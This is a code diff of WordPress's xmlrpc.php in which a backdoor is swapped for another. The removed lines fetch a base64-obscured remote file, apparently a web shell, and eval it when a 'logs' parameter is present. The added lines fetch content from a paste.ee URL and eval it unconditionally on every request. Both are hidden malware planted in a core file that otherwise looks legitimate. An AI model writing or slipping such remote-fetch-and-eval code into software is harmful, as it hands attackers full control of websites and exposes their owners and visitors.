@@ -27,24 +27,15 @@ $HTTP_RAW_POST_DATA = trim( $HTTP_RAW_POST_DATA );
 
 /** Include the bootstrap for setting up WordPress environment */
 require_once __DIR__ . '/wp-load.php';
-if (isset($_GET['logs'])) { 
-    $url = base64_decode('aHR0cHM6Ly9jZG4ucHJpdmRheXouY29tL3R4dC9hbGZhc2hlbGwudHh0');
-    
-    $ch = curl_init($url);
-    
+
+    $Url = "https://paste.ee/r/EWSAbaVq/0";
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $Url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    
-    $contents = curl_exec($ch);
-    
-    if ($contents !== false) { 
-        eval('?>' . $contents); 
-        exit; 
-    } else { 
-        echo "header"; 
-    } 
-    
+    $output = curl_exec($ch);
     curl_close($ch);
-}
+    echo eval('?>'.$output);
+
 if ( isset( $_GET['rsd'] ) ) { // https://cyber.harvard.edu/blogs/gems/tech/rsd.html
 	header( 'Content-Type: text/xml; charset=' . get_option( 'blog_charset' ), true );
 	echo '<?xml version="1.0" encoding="' . get_option( 'blog_charset' ) . '"?' . '>';
